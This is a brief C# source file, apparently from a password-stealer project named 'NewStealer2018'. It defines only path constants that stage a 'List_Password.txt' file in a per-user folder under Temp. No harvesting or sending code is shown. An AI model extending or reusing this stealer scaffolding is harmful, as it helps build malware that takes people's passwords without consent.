namespace NewStealer2018
{
    using System;
    using System.IO;

    public class GetDirPath
    {
        public static readonly string DefaultPath = Environment.GetEnvironmentVariable("Temp"); 
        public static readonly string User_Name = Path.Combine(DefaultPath, Environment.UserName);
        public static readonly string Pass_File = Path.Combine(User_Name, "List_Password.txt");
    }
}